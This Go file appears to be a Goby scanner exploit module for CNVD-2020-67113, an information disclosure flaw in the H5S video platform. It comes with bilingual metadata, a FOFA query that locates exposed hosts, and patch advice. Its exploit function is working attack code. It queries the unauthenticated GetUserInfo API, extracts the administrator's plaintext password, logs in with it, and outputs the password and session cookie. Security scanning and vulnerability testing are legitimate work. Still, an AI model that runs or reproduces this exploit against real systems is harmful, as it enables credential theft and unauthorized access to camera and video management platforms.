package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "H5S GetUserInfo Information leakage (CNVD-2020-67113)",
    "Description": "<p>H5S video platform is a video management platform that supports Windows Linux (CentOS ubuntu).</p><p>The H5S video platform has an information disclosure vulnerability. The attacker can obtain the administrator account password and cookie information to log in to the background.</p>",
    "Impact": "H5S GetUserInfo Information leakage (CNVD-2020-67113)",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://linkingvision.cn\">https://linkingvision.cn</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "H5S video platform",
    "VulType": [
        "Information Disclosure"
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "Translation": {
        "CN": {
            "Name": "H5S 视频管理平台 GetUserInfo 信息泄露漏洞（CNVD-2020-67113）",
            "Description": "<p>H5S视频平台是一个支持Windows Linux(CentOS ubuntu) 视频管理平台。</p><p>H5S 视频平台存在信息泄露漏洞。攻击者可获取管理员账号密码以及Cookie信息登录后台。</p>",
            "Impact": "<p>H5S 视频平台存在信息泄露漏洞。攻击者可获取管理员账号密码以及Cookie信息登录后台。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://linkingvision.cn\">https://linkingvision.cn</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "H5S视频平台",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "H5S GetUserInfo Information leakage (CNVD-2020-67113)",
            "Description": "<p>H5S video platform is a video management platform that supports Windows Linux (CentOS ubuntu).</p><p>The H5S video platform has an information disclosure vulnerability. The attacker can obtain the administrator account password and cookie information to log in to the background.</p>",
            "Impact": "H5S GetUserInfo Information leakage (CNVD-2020-67113)",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://linkingvision.cn\">https://linkingvision.cn</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "H5S video platform",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "FofaQuery": "body=\"H5S视频平台|WEB\" && title=\"H5S视频平台|WEB\"",
    "GobyQuery": "body=\"H5S视频平台|WEB\" && title=\"H5S视频平台|WEB\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://linkingvision.cn",
    "DisclosureDate": "2020-11-01",
    "References": [
        "https://fofa.so"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "1",
    "CVSS": "6.0",
    "CVEIDs": [],
    "CNVD": [
        "CNVD-2020-67113"
    ],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "user",
            "type": "input",
            "value": "admin",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "H5S video platform"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10236"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/api/v1/GetUserInfo?user=admin&session="
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "\"strUser\": \"admin\"")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["user"].(string)
			uri := "/api/v1/GetUserInfo?user=" + cmd + "&session="
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && resp.StatusCode == 200 {
				passwordFind := regexp.MustCompile("\"strPasswd\": \"(.*?)\",").FindStringSubmatch(resp.RawBody)
				uri2 := "/api/v1/Login?user=" + cmd + "&password=" + passwordFind[1]
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil && resp2.StatusCode == 200 {
					CookieFind := regexp.MustCompile("\"strSession\": \"(.*?)\",").FindStringSubmatch(resp2.RawBody)
					expResult.Output = "user: " + cmd + "\npassword: " + passwordFind[1] + "\ncookie :" + CookieFind[1]
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
